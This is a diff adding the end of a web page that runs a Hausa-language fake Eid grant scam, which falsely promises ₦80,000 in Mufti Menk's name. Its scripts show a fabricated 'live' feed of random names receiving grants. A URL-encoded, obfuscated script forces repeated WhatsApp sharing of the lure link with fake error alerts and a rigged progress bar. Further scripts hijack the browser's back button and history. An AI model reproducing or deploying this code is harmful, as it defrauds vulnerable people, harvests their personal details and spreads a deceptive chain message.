+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                    $("#getname1").html($("#phone").val());
+                    $("#getname2").html($("#state").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+
+    <script>
+        var text1 ="*%2AShin%20Ka%20Cancanci%20Tallafin%20%E2%82%A680%2C000%20Na%20Sallah%3F%2A%0A%0ADomin%20murnar%20Eid-al-Fitr%202026%2C%20shahararren%20malamin%20Musulunci%20Mufti%20Ismail%20Ibn%20Musa%20Menk%20ya%20%C6%99addamar%20da%20tallafin%20ku%C9%97i%20%E2%82%A680%2C000%20domin%20taimaka%20wa%20iyalai%20a%20fa%C9%97in%20Najeriya.%0A%0A%2AAna%20ba%20masu%20cancanta%20%E2%82%A680%2C000%20kai%20tsaye%2A%0A%0ACika%20fom%20%C9%97in%20yana%20%C9%97aukar%20%C6%99asa%20da%20minti%201%20kawai.%0A%0A%F0%9F%91%87%20%2ADanna%20nan%20domin%20duba%20ko%20ka%20cancanta%20kuma%20ka%20nema%20yanzu%2A%F0%9F%91%87%0A%0Ahttps://nema.getsallah.online/murnar-Eid-al-Fitr-daga-Mufti-Ismail-Ibn-Musa-Menk",
+            text2 = " an amount of ",
+            text3 = " for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "/",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+<!-- Live transaction feed – Hausa grants (15k–75k, 2sec) -->
+<style>
+  /* inline styles – copy exactly as needed */
+  .tx-feed-root {
+    max-width: 560px;
+    width: 100%;
+    background: rgba(255, 255, 255, 0.75);
+    backdrop-filter: blur(16px) saturate(180%);
+    -webkit-backdrop-filter: blur(16px) saturate(180%);
+    border-radius: 2.5rem;
+    box-shadow: 0 30px 50px -20px #1b4e48, 0 0 0 1px rgba(255,255,255,0.7) inset;
+    padding: 1.5rem 1.2rem;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  }
+  .tx-feed-scroll {
+    background: rgba(240, 248, 246, 0.5);
+    border-radius: 2rem;
+    padding: 0.8rem 0.2rem 0.8rem 0.8rem;
+    height: 500px;
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: #4f8e89 #c2dfdb;
+    border: 1px solid rgba(255,255,255,0.9);
+    box-shadow: inset 0 3px 12px rgba(26, 67, 62, 0.1);
+  }
+  .tx-feed-scroll::-webkit-scrollbar {
+    width: 6px;
+  }
+  .tx-feed-scroll::-webkit-scrollbar-track {
+    background: #c2dfdb;
+    border-radius: 20px;
+  }
+  .tx-feed-scroll::-webkit-scrollbar-thumb {
+    background: #4f8e89;
+    border-radius: 20px;
+  }
+  .tx-list {
+    display: flex;
+    flex-direction: column;
+    gap: 0.8rem;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  .tx-item {
+    background: white;
+    border-radius: 2rem;
+    padding: 1rem 1.3rem;
+    display: flex;
+    align-items: center;
+    gap: 1.2rem;
+    box-shadow: 0 10px 20px -12px #1f5b53, 0 0 0 1px rgba(0,0,0,0.02);
+    border: 1px solid rgba(255,255,255,0.9);
+    transition: transform 0.2s cubic-bezier(0.2, 0.9, 0.3, 1.1), box-shadow 0.25s;
+    animation: slideFade 0.3s ease-out;
+  }
+  .tx-item:hover {
+    transform: translateX(6px) scale(1.01);
+    box-shadow: 0 18px 28px -14px #18635a;
+    border-color: #b9e2db;
+  }
+  @keyframes slideFade {
+    0% { opacity: 0.3; transform: translateY(-18px); }
+    100% { opacity: 1; transform: translateY(0); }
+  }
+  .tx-avatar {
+    width: 52px;
+    height: 52px;
+    background: linear-gradient(145deg, #227a6b, #14584b);
+    color: white;
+    font-weight: 600;
+    font-size: 1.6rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 45% 55% 40% 60% / 55% 45% 60% 40%;
+    box-shadow: 0 10px 14px -8px #0b3d36;
+    text-transform: uppercase;
+    flex-shrink: 0;
+    border: 2px solid rgba(255,250,235,0.8);
+  }
+  .tx-content {
+    flex: 1;
+  }
+  .tx-message {
+    font-size: 1.1rem;
+    font-weight: 520;
+    color: #103f39;
+    line-height: 1.45;
+    word-break: break-word;
+  }
+  .name-badge {
+    font-weight: 700;
+    color: #0f6f5c;
+    background: #e0f7f2;
+    padding: 0.2rem 0.6rem;
+    border-radius: 40px;
+    display: inline-block;
+    margin-right: 0.2rem;
+    border: 1px solid #bae9e1;
+  }
+  .amount-chip {
+    font-weight: 670;
+    color: #195e48;
+    background: #e1f5ec;
+    padding: 0.2rem 0.7rem;
+    border-radius: 40px;
+    font-size: 1rem;
+    display: inline-block;
+    margin-left: 0.2rem;
+    border: 1px solid #b0e0d3;
+    white-space: nowrap;
+  }
+  .tx-time {
+    font-size: 0.78rem;
+    color: #46746b;
+    margin-top: 6px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .tx-time i {
+    font-style: normal;
+    background: #d7f0eb;
+    border-radius: 30px;
+    padding: 2px 8px;
+    font-size: 0.7rem;
+    font-weight: 500;
+  }
+</style>
+
+<div class="tx-feed-root">
+  <div class="tx-feed-scroll" id="txFeedContainer">
+    <ul class="tx-list" id="txList"></ul>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- HAUSA NAMES (expanded) -----
+    const names = [
+      "Musa", "Amina", "Sani", "Fatima", "Ibrahim", "Hauwa", "Usman", "Zainab",
+      "Bello", "Aisha", "Abubakar", "Maryam", "Yusuf", "Halima", "Adamu", "Hadiza",
+      "Haruna", "Rahma", "Kabir", "Sa’ad", "Ahmad", "Ladi", "Gambo", "Hassan",
+      "Rabiu", "Khadija", "Jibril", "Nana", "Hamza", "Aishatu", "Bashir", "Zarah",
+      "Suleiman", "Hafsatu", "Idris", "Balarabe", "Fadila", "Muhammad", "Lami",
+      "Garba", "Zuwaira", "Maimuna", "Danladi", "Rukayya", "Lawal", "Awwal"
+    ];
+
+    // ----- ONLY "SEND TO" GRANT MESSAGES -----
+    const templates = [
+      "₦{amount} send to {name} ✨ (grant)",
+      "grant ₦{amount} → {name}",
+      "{name} received grant ₦{amount}",
+      "send ₦{amount} to {name} (grant)",
+      "₦{amount} disbursed to {name} (grant)",
+      "transfer grant ₦{amount} → {name}",
+      "{name} · grant credited ₦{amount}",
+      "₦{amount} grant for {name} sent",
+      "{name} just got grant ₦{amount}",
+      "grant ₦{amount} send to {name} ✓"
+    ];
+
+    const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
+    const formatAmount = (amt) => amt.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+
+    function randomGrantAmount() {
+      const min = 15000, max = 75000, step = 500;
+      const steps = Math.floor((max - min) / step) + 1;
+      return min + (Math.floor(Math.random() * steps) * step);
+    }
+
+    const feedList = document.getElementById('txList');
+    const MAX_ITEMS = 12;
+
+    function createTxItem(name, message, amountFormatted) {
+      const item = document.createElement('li');
+      item.className = 'tx-item';
+
+      const avatar = document.createElement('div');
+      avatar.className = 'tx-avatar';
+      avatar.textContent = name.charAt(0).toUpperCase();
+
+      const content = document.createElement('div');
+      content.className = 'tx-content';
+
+      let displayMsg = message
+        .replace('{name}', `<span class="name-badge">${name}</span>`)
+        .replace('{amount}', `<span class="amount-chip">₦${amountFormatted}</span>`);
+
+      const msgPara = document.createElement('div');
+      msgPara.className = 'tx-message';
+      msgPara.innerHTML = displayMsg;
+
+      const timeSpan = document.createElement('div');
+      timeSpan.className = 'tx-time';
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString('en-NG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      timeSpan.innerHTML = `<i>⏺ now</i> <span style="margin-left:auto; background:#e1f2ee; padding:0.1rem 0.7rem; border-radius:40px;">${timeStr}</span>`;
+
+      content.appendChild(msgPara);
+      content.appendChild(timeSpan);
+      item.appendChild(avatar);
+      item.appendChild(content);
+
+      return item;
+    }
+
+    function generateGrant() {
+      const name = randomItem(names);
+      const template = randomItem(templates);
+      const amount = randomGrantAmount();
+      const amountStr = formatAmount(amount);
+      const msg = template.replace('{name}', name).replace('{amount}', amountStr);
+      return createTxItem(name, msg, amountStr);
+    }
+
+    function addGrantToFeed() {
+      const newTx = generateGrant();
+      if (feedList.firstChild) {
+        feedList.insertBefore(newTx, feedList.firstChild);
+      } else {
+        feedList.appendChild(newTx);
+      }
+      while (feedList.children.length > MAX_ITEMS) {
+        feedList.removeChild(feedList.lastChild);
+      }
+    }
+
+    // initial seeding
+    for (let i = 0; i < 5; i++) {
+      feedList.appendChild(generateGrant());
+    }
+    while (feedList.children.length > MAX_ITEMS) {
+      feedList.removeChild(feedList.lastChild);
+    }
+
+    // LIVE — 2 seconds interval
+    setInterval(addGrantToFeed, 2000);
+    setTimeout(addGrantToFeed, 1200);
+  })();
+</script>
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+ 
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="/";
+    }
+    function goon(){
+        location.href="/";
+    }
+</script>
+
+<script>
+(function (global) {
+
+	if(typeof (global) === "undefined")
+	{
+		throw new Error("window is undefined");
+	}
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+		// making sure we have the fruit available for juice....
+		// 50 milliseconds for just once do not cost much (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+	
+	// Earlier we had setInerval here....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+		noBackPlease();
+
+		// disables backspace on page except on input fields and textarea..
+		document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // stopping event bubbling up the DOM tree..
+            e.stopPropagation();
+        };
+		
+    };
+
+})(window);
+</script>
+<script>
+    function generateRandom() {
+        const numbers = '0123456789';
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        let randomString = '';
+        
+        // Generate 3 random digits
+        for (let i = 0; i < 3; i++) {
+            randomString += numbers.charAt(Math.floor(Math.random() * numbers.length));
+        }
+        
+        // Generate 2 random letters
+        for (let i = 0; i < 2; i++) {
+            randomString += letters.charAt(Math.floor(Math.random() * letters.length));
+        }
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById('output').textContent = randomString;
+        });
+    }
+    generateRandom();
+</script>
+
+
+
+<script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+
+
+</body></html>
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1729810,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
